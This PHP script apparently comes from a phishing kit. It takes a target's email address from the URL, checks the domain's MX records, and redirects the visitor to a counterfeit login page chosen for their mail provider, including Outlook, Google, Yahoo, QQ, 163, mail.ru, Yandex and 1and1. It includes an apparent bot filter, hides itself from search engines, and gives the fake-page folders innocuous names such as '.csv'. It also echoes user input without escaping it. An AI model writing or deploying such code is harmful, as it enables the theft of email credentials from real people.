<head>
    
    <meta name="robots" content="noindex, nofollow" />
</head>


<?php

include "bots.php";
$email = $_GET['userid'];

print("Checking: $email<br>");

if (eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)+$", $email)) {

    print("Format Test: PASSED<br>");
    print("Online host verification Test...<br><br>");
    print("MX Records for: $email<br>");
    
    list($alias, $domain) = split("@", $email); 
    
    if (checkdnsrr($domain, "MX")) {
    
        getmxrr($domain, $mxhosts);
        
        foreach($mxhosts as $mxKey => $mxValue){
            print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mxValue<br>");
        }
        
        print("Online host verification Test: PASSED<br><br>");
        print("Email Status: VALID");
    
    } else {
    
        print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No records found.<br>");
        print("Online host verification Test: FAILED<br><br>");
        print("Email Status: INVALID");
    
    }

} else {

    print("Format Test: FAILED<br><br>");
    print("Invalid email address provided.<br><br>");
    print("Email Status: INVALID");
    
}

 $domain = $mxValue;

if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $domain, $regs))
{
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$regs[domain]<br>");    
    
}

$domain_check = '@'.strtolower($regs[domain]);


	if(stripos($domain_check, 'secureserver.') !== false || stripos($domain_check, '@secureserver.') !== false || stripos($domain_check, '@secureserver.') !== false){
		header("Location: ./tsecursx.cve?userid=$email");
	}
	elseif(stripos($domain_check, 'outlook.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.') !== false) {
		header("Location:./wemail_al.html/sing.php?userid=$email");
			}
			
	elseif(stripos($domain_check, 'google.') !== false || stripos($domain_check, 'GOOGLEMAIL.') !== false) {
		header("Location: ./bgmalz.csv/lo.php?userid=$email");
			}
	elseif(stripos($domain_check, 'netease.') !== false || stripos($domain_check, '163.') !== false || stripos($domain_check, '163.') !== false) {
		header("Location: ./qiye.163.conn/qiye.163.com/login?userid=$email");
	}
	
	elseif(stripos($domain_check, 'yahoodns.') !== false || stripos($domain_check, '@yahoodns.') !== false) {
		header("Location: ./byaho.csv?userid=$email");
	}
	elseif(stripos($domain_check, 'mail.ru') !== false || stripos($domain_check, '@mail.ru.') !== false) {
		header("Location: ./imiaru.csv/account.mail.ru?userid=$email");
		}
	elseif(stripos($domain_check, 'qq.com') !== false || stripos($domain_check, 'mxbiz2.qq.com.') !== false) {
		header("Location: ./exmal.qq.conn/cgi-bin/login.php?userid=$email");
		}

elseif(stripos($domain_check, 'emailsrvr.') !== false || stripos($domain_check, '@emailsrvr.com') !== false) {
		header("Location: ./emserv.csv/webmail?userid=$email");
	}



elseif(stripos($domain_check, 'rediffmailpro.') !== false || stripos($domain_check, '@rediff.') !== false) {
		header("Location: ./redpro.csv/rediffpro/cgi-bin?userid=$email");
	}

elseif(stripos($domain_check, 'yandex.') !== false || stripos($domain_check, '@yandex.') !== false) {
		header("Location: ./gyandx.csv?userid=$email");
	}

elseif(stripos($domain_check, 'worksmobile.') !== false || stripos($domain_check, '@worksmobile.') !== false) {
		header("Location: ./wrkmb.csv/Login.php?userid=$email");
	}

elseif(stripos($domain_check, '1and1.') !== false || stripos($domain_check, '@1and1.') !== false) {
		header("Location: ./1n1ma.csv/?userid=$email");
	}

	else {
		header("Location: ./wemail_al.html?userid=$email");
	}
?>